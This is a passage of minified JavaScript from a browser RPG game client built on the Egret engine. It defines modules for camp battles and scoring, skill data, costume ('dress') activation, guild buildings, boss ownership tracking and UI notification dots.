u.BattleRankVo,this.battleRanks[n]=i),i.parse(t);this.postRankInfo()},e.prototype.doOpen=function(t){this.isOpen=t.readBoolean(),this._openLeftTime=t.readInt(),this._openTimer=egret.getTimer(),this.postOpenInfo()},e.prototype.postOpenInfo=function(){},e.prototype.getOpenLeftTime=function(){return this._openLeftTime-(egret.getTimer()-this._openTimer)/1e3},e.prototype.getRankTop=function(t){return void 0===t&&(t=3),this.battleRanks?this.battleRanks.slice(0,t):null},e.prototype.postRankInfo=function(){},e.prototype.getLeftTime=function(){return Math.floor((this._leftTime-l.GameServerCC.serverTime)/1e3)},e.prototype.sendReLive=function(){this.sendBaseProto(4)},e.prototype.getMyAward=function(){this.sendBaseProto(5)},e.prototype.getAwardResult=function(t){t.readBoolean()},e.prototype.doAwardInfo=function(t){this.awardID=t.readInt(),this.postGiftInfo()},e.prototype.postGiftInfo=function(){},e.prototype.doMyScore=function(t){this.myScore=t.readInt();var e,i=t.readInt(),n=t.readString(),o=t.readUnsignedByte();switch(o){case 1:e=gettext("成功击杀|C:0x00ff00&T:{0}|，积分+|C:0x00ff00&T:{1}|",n,i);break;case 2:e=gettext("助攻击杀|C:0x00ff00&T:{0}|，积分+|C:0x00ff00&T:{1}|",n,i);break;case 3:e=gettext("被|C:0x00ff00&T:{0}|击杀，积分+|C:0x00ff00&T:{1}|",n,i);break;case 4:e=gettext("获得持续参与奖，积分+|C:0x00ff00&T:{0}|",i);break;case 5:e=gettext("杀怪获得积分+|C:0x00ff00&T:{0}|",i)}e&&(r.GameMap.checkIsInKf3v3()?h.TipsCT.ins().showCenterTips5(e):h.TipsCT.ins().showCenterTips3(e)),this.postScoreChange()},e.prototype.doMyRank=function(t){this.myRank=t.readInt(),this.myScore=t.readInt(),this.postScoreChange()},e.prototype.postScoreChange=function(){},e.prototype.doEnterCD=function(t){this._enterCD=t.readInt(),this._enterCDTimer=egret.getTimer()},e.prototype.doGameOver=function(t){win.open("BattleResultWin")},e.prototype.postLittleChange=function(t){this._changeLittle=n.DateUtils.formatMiniDateTime(t.readInt())},e.prototype.getChangeLittleTime=function(){return Math.floor((this._changeLittle-l.GameServerCC.serverTime)/1e3)},e.prototype.canMove=function(){return this.getChangeLittleTime()<=0},e.prototype.postChangeTime=function(t){this._changeTime=n.DateUtils.formatMiniDateTime(t.readInt())},e.prototype.postKilled=function(t){return t.readShort()},e.prototype.getChangeTime=function(){return Math.floor((this._changeTime-l.GameServerCC.serverTime)/1e3)},e.prototype.getEnterCD=function(){return Math.ceil(this._enterCD-(egret.getTimer()-this._enterCDTimer)/1e3)},e.prototype.checkRedPoint=function(){return this.isOpen&&a.ActorCC.level>=s.GlobalConfig.CampBattleConfig.openLevel},__decorate([post()],e.prototype,"postEnterSuccess",null),__decorate([post()],e.prototype,"postOpenInfo",null),__decorate([post()],e.prototype,"postRankInfo",null),__decorate([post()],e.prototype,"postGiftInfo",null),__decorate([post()],e.prototype,"postScoreChange",null),__decorate([post()],e.prototype,"postLittleChange",null),__decorate([post()],e.prototype,"postChangeTime",null),__decorate([post()],e.prototype,"postKilled",null),e}(o.BaseSystem);e.BattleCC=p,window.BattleCC=p,__reflect(p.prototype,"BattleCC",[]),Systemap.BattleCC=function(){return p.ins()},window.BattleCC=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonCirRedPoint=void 0;var n=i(14),o=i(115),s=i(6),a=i(13),r=i(0),l=function(t){function e(){var e=t.call(this)||this;return e.redPoint=!1,e.roleTabs=[],e.taskPoint=!1,e.roleYunyang=[],e.yunyangPoints=[],e.zhenYanPoints=[],e.roleQianneng=[],e.qiannengPoints=[],observe(e,e.postRedPoint,e.postRoleRedPoint),observe(e,e.postRoleRedPoint,o.DemonCir.ins().postRoleDatas,o.DemonCir.ins().postSpecialUp,o.DemonCir.ins().postDemonLevelUp,o.DemonCir.ins().postDemonCirLevelCfg,o.DemonCir.ins().postTalentUp,s.BagCT.ins().postItemAdd,s.BagCT.ins().postItemChange,s.BagCT.ins().postItemDel),e
}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){this.redPoint=!1;return;for(var t=0;t<this.roleTabs.length;t++)this.roleTabs[t]&&(this.redPoint=!0)},e.prototype.postRoleRedPoint=function(){for(var t=0;3>t;t++){var e=a.SubRoles.ins().getSubRoleByIndex(t);if(e){var i=this.yunyangPoint(t),n=!1;this.roleYunyang[t]=i,this.roleQianneng[t]=n,this.roleTabs[t]=i||n}else this.roleTabs[t]=!1}return!0},e.prototype.qiannengPoint=function(t){this.qiannengPoints[t]=[];var e=!1,i=a.SubRoles.ins().getSubRoleByIndex(t);if(!i)return null;var n=o.DemonCir.ins().getRoleDataByID(t);if(!n)return null;var l,h;for(var u in r.GlobalConfig.DemonCirBase){this.qiannengPoints[t][u]=!1;var p=r.GlobalConfig.DemonCirBase[u],d=n.getDemonDataByID(p.id),c=null!=d;if(c){for(var f=0,g=0;5>g;g++){var m=d.getActiveByIndex(g),v=r.GlobalConfig.DemonCirSkill[p.skillgroup[g]];m&&(l=d.specialVals[g]);for(var y=Object.keys(v).length,C=l?l.length:0,T=!0,b=0;y>b;b++){h=C>b?l[b]:null;var w=v[b+1];(!h||h.value<w.attrMax)&&(T=!1)}T&&f++}var I=f>=5;if(!I){var _=s.BagCT.ins().getBagItemById(p.skillcost.id),S=_?_.count:0;S>=p.skillcost.count&&(this.qiannengPoints[t][u]=!0,e=!0)}}}return e},e.prototype.yunyangPoint=function(t){this.yunyangPoints[t]=[],this.zhenYanPoints[t]=[];var e=!1,i=a.SubRoles.ins().getSubRoleByIndex(t);if(!i)return null;var n=o.DemonCir.ins().getRoleDataByID(t);if(!n)return null;var l=s.BagCT.ins().getBagItemById(r.GlobalConfig.DemonCirConf.expItemId),h=l?l.count:0;for(var u in r.GlobalConfig.DemonCirBase){var p=r.GlobalConfig.DemonCirBase[u],d=n.getDemonDataByID(p.id),c=null!=d;if(this.yunyangPoints[t][u]=!1,c)if(d.level>=r.GlobalConfig.DemonCirBase[p.id].maxLevel);else{var f=o.DemonCir.ins().getDemonCirLevelCfg(p.id,d.level);f&&h>=f.count&&(this.yunyangPoints[t][u]=!0,e=!0)}else{var g=s.BagCT.ins().getBagItemById(p.mat),m=g?g.count:0;m>=p.matCost&&(this.yunyangPoints[t][u]=!0,e=!0)}if(c&&d.talentLv>0&&d.talentLv<Object.keys(r.GlobalConfig.DemonCirTalent[p.talent]).length){var v=r.GlobalConfig.DemonCirTalent[p.talent][d.talentLv+1],g=s.BagCT.ins().getBagItemById(p.mat);g&&g.count>=v.costCount&&(this.zhenYanPoints[t][u]=!0,e=!0)}else this.zhenYanPoints[t][u]=!1}return e},e.prototype.getTalentRed=function(t){var e=o.DemonCir.ins().getRoleDataByID(0);if(!e)return null;var i=e.getDemonDataByID(t),n=r.GlobalConfig.DemonCirBase[i.id];if(!r.GlobalConfig.DemonCirTalent[n.talent])return!1;var a=null!=i;if(a&&i.talentLv>0&&i.talentLv<Object.keys(r.GlobalConfig.DemonCirTalent[n.talent]).length){var l=r.GlobalConfig.DemonCirTalent[n.talent][i.talentLv+1],h=s.BagCT.ins().getBagItemById(n.mat);if(h&&h.count>=l.costCount)return!0}return!1},__decorate([post()],e.prototype,"postRedPoint",null),__decorate([post()],e.prototype,"postRoleRedPoint",null),e}(n.BaseSystem);e.DemonCirRedPoint=l,window.DemonCirRedPoint=l,__reflect(l.prototype,"DemonCirRedPoint",[]),Systemap.DemonCirRedPoint=function(){return l.ins()},window.DemonCirRedPoint=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TabClearItemRender=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.item.data=this.data,this.item.touchEnabled=!1,this.item.touchChildren=!1},e}(n.BaseItemRender);e.TabClearItemRender=o,window.TabClearItemRender=o,__reflect(o.prototype,"TabClearItemRender",[]),window.TabClearItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RegExpUtil=void 0;var n=function(){function t(){}return t.LINE_BREAK=/\r+/g,t.BLANK_REG=/[\s\\]/g,t.ARGB_COLOR=/[a-fA-F0-9]{8}/,t.HTML=/<[^>]+>/g,t.DELETE_SPACE=/\s/g,t.REPLACE_STRING=/%s/g,t.NumericExp=/^\d+$/,t.NonNumericExp=/\D/,t.ActorNameExp=/^([\u4e00-\u9fa5]?\w?[^>|!@#$%&*\^\?]){1,48}$/,t.CHAT_EMOJI=/\$[0-9]{1,4}\$/g,t.CHAT_EMOJI_ID=/\$/g,t.GONG_LUE=/#[0-9]{1,10}#/g,t.GONG_LUE_ITEMID=/#/g,t}();e.RegExpUtil=n,window.RegExpUtil=n,__reflect(n.prototype,"RegExpUtil",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillData=void 0;var n=i(0),o=i(65),s=i(86),a=i(37),r=i(53),l=i(13),h=i(104),u=i(80),p=function(){function t(t,e){this._specialCD=0,this.useTime=0,this._value=0,this._supLv=0,this.MaxLv=20,this.endEffTime=0,this.autoState=!1,t&&(this.configID=t),e&&(this._value=e)}return t.prototype.setMsUse=function(t){var e=egret.getTimer();2501==this.descID?this.endEffTime=e-this.cd+t:this.useTime=e-this.cd+t},Object.defineProperty(t.prototype,"lv",{get:function(){return this._id%1e3},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"job",{get:function(){return Math.floor(this._id/1e5)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"id",{get:function(){return 1e3*Math.floor(this._id/1e3)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"icon",{get:function(){return this.id+"_png"},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"index",{get:function(){var t=this._id-1e5*this.job;return Math.floor(t/1e3)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"configID",{get:function(){for(var t=this._id;!n.GlobalConfig.SkillsConfig[t]&&t%1e3!=0;)t--;return t},set:function(t){this._id=t,this.config=n.GlobalConfig.SkillsConfig[t],0==this.lv||this.config||(this.config=n.GlobalConfig.SkillsConfig[this.getMaxLv(t)])},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"supLv",{get:function(){return this._supLv},set:function(t){this._supLv=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"value",{get:function(){return this._value},set:function(t){this._value=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"lv1ConfigID",{get:function(){return this.id+1},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"castType",{get:function(){return isNaN(this.config.castType)?2:this.config.castType},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"targetType",{get:function(){return isNaN(this.config.targetType)?2:this.config.targetType},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"desc",{get:function(){var t=this.config||n.GlobalConfig.SkillsConfig[this.lv1ConfigID];return o.SkillUtil.getDesc(t)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"affectRange",{get:function(){return isNaN(this.config.affectRange)?1:this.config.affectRange},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"affectCount",{get:function(){return isNaN(this.config.affectCount)?1:this.config.affectCount},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"calcType",{get:function(){return isNaN(this.config.calcType)?1:this.config.calcType},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"herdMonRate",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?isNaN(t.herdMonRate)?100:t.herdMonRate:100},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"herdPlayerRate",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?isNaN(t.herdPlayerRate)?10:t.herdPlayerRate:10},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"cd",{get:function(){if(this._specialCD>0)return this._specialCD;var t=n.GlobalConfig.SkillsDescConfig[this.descID],e=h.EquipInlayCT.ins().getReviseSkillIdCD(this._id),i=u.TotemCT.ins().returnTotemSkillCD(this._id),o=s.SkillCT.ins().getReviseSkillIdCD(this.descID);return t?t.cd-e-i-o:0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"specialCD",{set:function(t){this._specialCD=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isPassive",{get:function(){return!!this.config.passive},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"rate",{get:function(){return this.config.passive&&this.config.passive.rate||0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"cond",{get:function(){return this.config.passive&&this.config.passive.cond||0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"castRange",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?t.castRange:0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"repelDistance",{get:function(){return this.config.repelDistance},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"teleport",{get:function(){return this.config.teleport},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"actionType",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?t.actionType:""},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"tarEff",{get:function(){return this.config.tarEff},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"otarEff",{get:function(){return this.config.otarEff},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"selfEff",{get:function(){return this.config.selfEff},enumerable:!1,configurable:!0}),t.prototype.isEffectsSkillType=function(t){for(var e=this.config.tarEff||[],i=0;i<e.length;i++){var o=n.GlobalConfig.EffectsConfig[e[i]];if(o&&(null===o||void 0===o?void 0:o.type)==t)return!0}return!1},Object.defineProperty(t.prototype,"canUse",{get:function(){var t=egret.getTimer();if(2501==this.descID){if(this.endEffTime>0&&t-this.endEffTime<this.cd)return!1}else if(this.useTime&&t-this.useTime<this.cd)return!1;return this.lv?this.isEffectsSkillType(2)&&!a.EntityManager.ins().findNeedAddHpTar()?!1:this.isEffectsSkillType(5)&&2301!=this.descID&&!r.ControlCC.isCanUsePetSkill?!1:2501==this.descID&&l.SubRoles.lookAtTar.haveBuff(25001)?!1:!0:!1},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"skillMP",{get:function(){return this.config.mp||0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"autoUse",{get:function(){return this.autoState},set:function(t){this.autoState=t},enumerable:!1,configurable:!0}),t.prototype.updateCD=function(t){this.useTime=t},t.prototype.closeCD=function(){this.useTime=0,this.endEffTime=0},Object.defineProperty(t.prototype,"name",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?t.name:""},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"args",{get:function(){return this.config?this.config.args:null},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"wordEff",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?t.wordEff:""},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"effType",{get:function(){return this.config.effType},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"otherSkills",{get:function(){return this.config.otherSkills},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"effectId",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?t.effectId:0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"sound",{get:function(){var t=n.GlobalConfig.SkillsDescConfig[this.descID];return t?t.sound:""},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"descID",{get:function(){var t=n.GlobalConfig.SkillsConfig[this.configID]||n.GlobalConfig.SkillsConfig[this.lv1ConfigID];return t?t.desc:0},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isLianJi",{get:function(){return 7==this.calcType},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"limit",{get:function(){return n.GlobalConfig.SkillsDescConfig[this.descID].limit},enumerable:!1,configurable:!0}),t.getSkillByJob=function(e,i,n,o){return void 0===i&&(i=1),void 0===n&&(n=1),void 0===o&&(o=0),new t(this.getSkillNewId(e,i,n),o)},t.getSkillNewId=function(t,e,i){return void 0===e&&(e=1),void 0===i&&(i=1),1e5*t+1e3*e+i},t.prototype.getMaxLv=function(t){for(var e=100*Math.floor(t/100),i=n.GlobalConfig.SkillsConfig,o=0,s=e;;){if(s++,!i[s])break;o=i[s].id}return o},t}();e.SkillData=p,window.SkillData=p,__reflect(p.prototype,"SkillData",[]),window.SkillData=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBuilding=void 0;var n;!function(t){t[t.GUILD_HALL=1]="GUILD_HALL",t[t.GUILD_LIANGONGFANG=2]="GUILD_LIANGONGFANG",t[t.GUILD_SHOP=3]="GUILD_SHOP",t[t.GUILD_COMMENT=4]="GUILD_COMMENT"}(n=e.GuildBuilding||(e.GuildBuilding={})),window.GuildBuilding=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlayWayPage=e.PlayWayWin=void 0;var n=i(1),o=i(17),s=i(78),a=i(54),r=i(147),l=i(51),h=i(183),u=i(141),p=i(73),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="PlayWayWinSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.param=t;var i=t[0]||0;observe(this,this.redRefresh,o.RedPointBaseSys.ins().RpChange),observe(this,this.redRefresh,u.KfArenaRedPoint.ins().postRedPoint),observe(this,this.redRefresh,h.GuildSoulsRedPoint.ins().postRedPoint),observe(this,this.updateOpenWin,s.DominateWorldCT.ins().updateOpenPanel),this.addChangingEvent(this.eTab,this.onTabChangIng),this.open(),this.eVs.selectedIndex=i,this.redRefresh(),this.tabRp(),a.Fb2CT.ins().sendForestInfo(),a.Fb2CT.ins().sendForestMapInfo(),a.Fb2CT.ins().sendForestMapStarLv(),a.Fb2CT.ins().sendForestBuyData()},e.prototype.onTabChangIng=function(t){var e=this.eTab.selectedIndex,i=this.eVs.getChildAt(e),n=egret.getQualifiedClassName(i);return"DominateWorldPanel"!=n||win.openCheck(egret.getDefinitionByName(n),[!0])?void 0:void t.preventDefault()},e.prototype.removeDisplay=function(){s.DominateWorldCT.ins().isPanelOpen=!1,this.removeObserve(),this.eVs&&this.eVs.numElements>0&&this.eVs.removeChildren()},e.prototype.redRefresh=function(){return void this.eTab.updateReds()},e.prototype.tabRp=function(){var t;return l.GuildBattleCT.ins().enterRp.v||l.GuildBattleCT.ins().dailyRewardRp.v||l.GuildBattleCT.ins().rewardAllotRp.v||r.GuildRP.ins().rp.v||p.PeakedSys.ins().rp.v||u.KfArenaRedPoint.ins().redpoint>0||r.GuildRP.ins().rp.v||(null===(t=p.PeakedSys.ins().mbRp)||void 0===t?void 0:t.v)||h.GuildSoulsRedPoint.ins().redPoint||s.DominateWorldCT.ins().AllBagRed.v},e.prototype.open=function(){if(this.param){var t=this.param[0]||0;if(2==t){var e=this.eVs.getElementAt(t);if(!e)return;e.openIdx=this.param[1]||0}}},e.prototype.updateOpenWin=function(){this.redRefresh(),this.tabRp()},e.prototype.GuideWaKuang=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideWaKuang()},e.prototype.GuideTT=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideTT()},__decorate([delayCall(100)],e.prototype,"redRefresh",null),e}(n.BaseView);e.PlayWayWin=d,window.PlayWayWin=d,__reflect(d.prototype,"PlayWayWin",[]);var c;!function(t){t[t.PlayWay=0]="PlayWay",t[t.Guild=1]="Guild",t[t.Peak=2]="Peak",t[t.KfArena3v3=3]="KfArena3v3",t[t.dominate=4]="dominate"}(c=e.PlayWayPage||(e.PlayWayPage={})),window.PlayWayPage=c,window.PlayWayPage=c,window.PlayWayWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Dress=e.DressTypeName=e.DressType=void 0;var n,o=i(14),s=i(642),a=i(643),r=i(2),l=i(13),h=i(38),u=i(37),p=i(6),d=i(4),c=i(0);!function(t){t[t.ROLE=1]="ROLE",t[t.ARM=2]="ARM",t[t.WING=3]="WING"}(n=e.DressType||(e.DressType={})),window.DressType=n;var f;!function(t){t[t[""]=0]="",t[t["角色"]=1]="角色",t[t["武器"]=2]="武器",t[t["翅膀"]=3]="翅膀"}(f=e.DressTypeName||(e.DressTypeName={})),window.DressTypeName=f;var g=function(t){function e(){var e=t.call(this)||this;return e.timeInfo={},e.posInfo=[],e.careerDic={},e.itemIdDic={},e.sysId=PackageID.Dress,e.regNetMsg(1,e.doDressInfo),e.regNetMsg(2,e.doDressActivationRes),e.regNetMsg(3,e.doDressUserRes),e.regNetMsg(4,e.doUnDressUserRes),e.regNetMsg(5,e.doDressTimeEnd),e.regNetMsg(6,e.postLevelUp),e.regNetMsg(7,e.postAddTime),e}return __extends(e,t),e.prototype.sendDressInfoReq=function(){this.sendBaseProto(1)},e.prototype.doDressInfo=function(t){this.parser(t),e.ins().postDressInfo()},e.prototype.sendDressActivationReq=function(t){var e=this.getBytes(2);e.writeInt(t),this.sendToServer(e)},e.prototype.doDressActivationRes=function(t){this.parserAct(t),e.ins().postJiHuo(),r.TipsCT.ins().showTips(gettext("|C:0xffffff&T:激活装扮形象成功|"))},e.prototype.sendDressUserReq=function(t,e){var i=this.getBytes(3);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.doDressUserRes=function(t){this.parserDress(t),e.ins().postDressInfo(),r.TipsCT.ins().showTips(gettext("|C:0xffffff&T:幻化形象成功|"))},e.prototype.sendUnDressUserReq=function(t,e){var i=this.getBytes(4);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.doUnDressUserRes=function(t){this.parserDress(t),e.ins().postDressInfo(),r.TipsCT.ins().showTips(gettext("|C:0xffffff&T:取消幻化形象成功|"))},e.prototype.doDressTimeEnd=function(t){this.parserDel(t),e.ins().postDressInfo()},e.prototype.parserAct=function(t){var e=new s.DressTimeInfo;e.dressId=t.readInt(),e.invalidtime=t.readInt(),e.lv=t.readInt(),this.timeInfo[e.dressId]=e},e.prototype.parserDress=function(t){var i=t.readByte(),n=this.posInfo[i],o=t.readByte(),s=t.readInt();n&&(n.posAry[o-1]=s);var a=l.SubRoles.ins().getSubRoleByIndex(i);1==o||2==o?h.EquipCT.ins().postEquipChange(i,o):e.ins().postChangeWing();var r=u.EntityManager.ins().getEntityByHandle(a.handle);r&&r.updateModel()},e.prototype.parserDel=function(t){var i=t.readInt();delete this.timeInfo[i];for(var n=0;n<this.posInfo.length;n++)for(var o=this.posInfo[n],s=0;3>s;s++)if(o.posAry[s]==i){o.posAry[s]=0;var a=l.SubRoles.ins().getSubRoleByIndex(n);0==s||1==s?h.EquipCT.ins().postEquipChange(n,s):e.ins().postChangeWing();var r=u.EntityManager.ins().getEntityByHandle(a.handle);r&&r.updateModel();break}},e.prototype.getModelPosId=function(t){return this.posInfo[t]},e.prototype.redPoint=function(){return this.careerRedPoint()},e.prototype.careerRedPoint=function(){for(var t=0;t<l.SubRoles.ins().subRolesLen;t++){var e=l.SubRoles.ins().getSubRoleByIndex(t).job,i=this.getIdByCareer(e);for(var n in i)for(var o=i[n],s=0,a=o;s<a.length;s++){var r=a[s];if(this.redPointDress(r.id))return!0}}return!1},e.ins=function(){return t.ins.call(this)},e.getCost=function(t){for(var e=t.cost,i=t.permanentCost,n=[i,e],o=0,s=n;o<s.length;o++){var a=s[o];if(a){var r=a.itemId,l=a.num,h=p.BagCT.ins().getBagGoodsCountById(p.BagCT.BAG_TYPE_OTHTER,r);if(h>=l)return[a,h]}}return[i||e,0]},e.prototype.canDress=function(t,e){if(e==n.WING&&d.ActorCC.level<=16)return!1;var i=this.getIdByCareer(t)[e];for(var o in i)if(this.redPointDress(i[o].id))return!0;return!1},e.prototype.parser=function(t){var e=t.readInt();this.timeInfo={};for(var i=0;e>i;i++){var n=new s.DressTimeInfo;n.dressId=t.readInt(),n.invalidtime=t.readInt(),n.lv=t.readInt(),this.timeInfo[n.dressId]=n}e=t.readByte(),this.posInfo=[];for(var i=0;e>i;i++){for(var o=new a.DressPosInfo,r=0;3>r;r++)o.posAry[r]=t.readInt();this.posInfo.push(o)}},e.prototype.posRedPoint=function(){for(var t=[!1,!1,!1],e=l.SubRoles.ins().subRolesLen,i=0;e>i;i++){var n=l.SubRoles.ins().getSubRoleByIndex(i).job,o=this.getIdByCareer(n);if(!o)break;for(var s=0;3>s;s++)if(!t[s])for(var a=o[s+1],r=0,h=a;r<h.length;r++){var u=h[r];if(this.redPointDress(u.id)){t[s]=!0;break}}}return t},e.prototype.redPointDress=function(t){var i=c.GlobalConfig.ZhuangBanId[t];if(i.pos==n.WING&&d.ActorCC.level<=16)return!1;var o=e.getCost(i),s=o[0],a=o[1];if(0==a)return!1;if(this.timeInfo[t]){var r=this.timeInfo[t].lv+1,l=c.GlobalConfig.ZhuangBanLevelUp[t];if(l&&l[r]&&l[r].cost.num<=a)return!0}else if(a>=s.num)return!0;return!1},e.prototype.isZhuangBanItem=function(t){var e=c.GlobalConfig.ZhuangBanId;for(var i in e){var n=e[i];if(n.cost&&n.cost.itemId==t||n.permanentCost&&n.permanentCost.itemId==t)return!0}return!1},e.prototype.isLimitZhuangBanItem=function(t){var e=c.GlobalConfig.ZhuangBanId;for(var i in e){var n=e[i];if(n.cost&&n.cost.itemId==t&&n.permanentCost)return!0}return!1},e.prototype.getIdZhuangBanId=function(t){var e=c.GlobalConfig.ZhuangBanId;for(var i in e){var n=e[i];if(n.cost&&n.cost.itemId==t)return n.id}return 0},e.prototype.sendLevelUp=function(t){var e=this.getBytes(6);e.writeInt(t),this.sendToServer(e)},e.prototype.postLevelUp=function(t){var e=t.readInt(),i=t.readInt(),n=t.readInt(),o=this.timeInfo[e];o.invalidtime=i,o.lv=n,this.postDressInfo()},e.prototype.postAddTime=function(t){var e=t.readInt(),i=t.readInt(),n=t.readInt(),o=this.timeInfo[e]||new s.DressTimeInfo;o.invalidtime=i,o.lv=n,o.dressId=e,this.timeInfo[e]=o},e.prototype.getIdByCareer=function(t){return this.careerDic[t]?this.careerDic[t]:(this.initConfig(),this.careerDic[t])},e.prototype.initConfig=function(){if(!Object.keys(this.itemIdDic).length){var t=c.GlobalConfig.ZhuangBanId;for(var e in t){var i=t[e],n=i.roletype,o=i.pos;if(this.careerDic[n]=this.careerDic[n]||{},this.careerDic[n][o]=this.careerDic[n][o]||[],this.careerDic[n][o].push(i),!i||!i.cost)break;var s=i.cost.itemId;this.itemIdDic[s]=this.itemIdDic[s]||[],this.itemIdDic[s].push(i)}}},e.checkOpen=function(t){return void 0===t&&(t=!1),!1},e.prototype.postDressInfo=function(){},e.prototype.postJiHuo=function(){},e.prototype.postChangeWing=function(){},__decorate([post()],e.prototype,"postLevelUp",null),__decorate([post()],e.prototype,"postAddTime",null),__decorate([post()],e.prototype,"postDressInfo",null),__decorate([post()],e.prototype,"postJiHuo",null),__decorate([post()],e.prototype,"postChangeWing",null),e}(o.BaseSystem);e.Dress=g,window.Dress=g,__reflect(g.prototype,"Dress",[]),Systemap.Dress=function(){return g.ins()},window.Dress=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BossCT=void 0;var n=i(18),o=i(42),s=i(14),a=i(4),r=i(20),l=i(2),h=i(37),u=function(t){function e(){var e=t.call(this)||this;return e.monsterID=0,e.hp=0,e.bossHandler=0,e.lastBossID=-1,e.attHandle=0,e.sysId=PackageID.Boss,e.regNetMsg(7,e.doBelongChange),e.regNetMsg(20,e.doBossBlood),observe(e,e.checkShow,Ts.enterScene.enterOK),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postBossAppear=function(){return this.monsterID},e.prototype.doBossBlood=function(t){this.monsterID=t.readInt(),this.hp=t.readDouble(),this.lastBossID=this.monsterID,this.bossHandler=t.readDouble(),EntityManager.ins().getEntityByHandle(this.bossHandler)&&this.hp<=0&&(this.lastBossID=-1,this.postHpZero());t.readDouble(),t.readShort()},e.prototype.doBelongChange=function(t){var e=t.readDouble(),i=t.readDouble(),n=t.readString();this.postBelongChange(e,i,n)},e.prototype.postBelongChange=function(t,e,i){if(void 0===e&&(e=0),void 0===i&&(i=""),this.attHandle=t,t>0){var s=h.EntityManager.ins().getMasterList(t),a="";if(!(s&&s[0]&&s[0].infoModel))return;a=s[0].infoModel.name,this.setBelongHPandColor();var r="";if(t>0&&e>0){var u=a,p=u.split("\n");u=p[1]?p[1]:p[0];var d=i;p=d.split("\n"),d=p[1]?p[1]:p[0],d=o.StringUtils.replaceStr(d,"0xffffff",n.ColorUtil.ROLENAME_COLOR_GREEN+""),r=gettext("|C:{0}&T:{1}|击败了|C:{2}&T:{3}|，成为了新的归属者。",n.ColorUtil.ROLENAME_COLOR_GREEN,u,n.ColorUtil.ROLENAME_COLOR_GREEN,d),console.error("++++++++++++++++"+r),l.TipsCT.ins().showSceneTips(r)}}},e.prototype.setBelongHPandColor=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,o;return __generator(this,function(s){if(this.attHandle!=a.ActorCC.handle)for(t=h.EntityManager.ins().getMasterList(this.attHandle),e=0,i=t;e<i.length;e++)o=i[e],o.data.type==EntityType.Role&&o.setNameTxtColor&&o.setNameTxtColor(n.ColorUtil.ROLENAME_COLOR_YELLOW);return[2]})})},e.prototype.getBelongName=function(){var t=h.EntityManager.ins().getMasterList(this.attHandle);if(t&&t.length>0){for(var e=t.length,i=void 0,n=void 0,o=0;e>o;o++){var 